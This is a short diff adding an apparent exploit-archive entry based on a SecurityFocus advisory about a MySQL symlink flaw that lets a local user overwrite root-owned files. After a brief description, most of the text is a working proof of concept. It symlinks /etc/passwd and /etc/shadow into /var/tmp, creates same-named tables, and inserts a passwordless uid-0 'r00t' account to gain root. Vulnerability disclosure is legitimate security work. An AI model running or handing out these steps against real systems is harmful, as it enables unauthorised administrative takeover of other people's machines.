@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/2522/info
+
+MySQL is a relational database management system (RDBMS), freely available and open source. It is maintained by MySQL AB.
+
+A problem with the implementation of some MySQL databases may permit local users to overwrite sensitive system files. This problem affects MySQL implementations that run the database under the uid of root. By using a symbolic link in the /var/tmp directory, and linking it to a file that is write-accesible by root, a user can log into the database with their account, and create a table with a name corresponding to that of the symbolic link. The creation of the table will overwrite the linked file, and any data created within the table will be written to the file that has been symbolically linked. This is dependent entirely upon the attacker having a MySQL account with the "create table" privilege.
+
+Therefore, it is possible for a local user to overwrite sensitive system files, and potentially gain elevated privileges, including administrative access.
+
+$ cd /var/tmp
+$ ln -s /etc/passwd gotcha.ISD
+$ ln -s /etc/shadow make_me_r00t.ISD
+$ mysql -u user -h localhost -p somepassword '../../tmp'
+create table gotcha(qqq varchar(255));
+create table make_me_r00t(qqq varchar(255));
+insert into gotcha values('\nr00t::0:0:Hacked_Fucked_R00T:/:/bin/sh\n');
+insert into make_me_r00t values('\nr00t::1:0:99999:7:-1:-1:\n');
+\q
+$ 
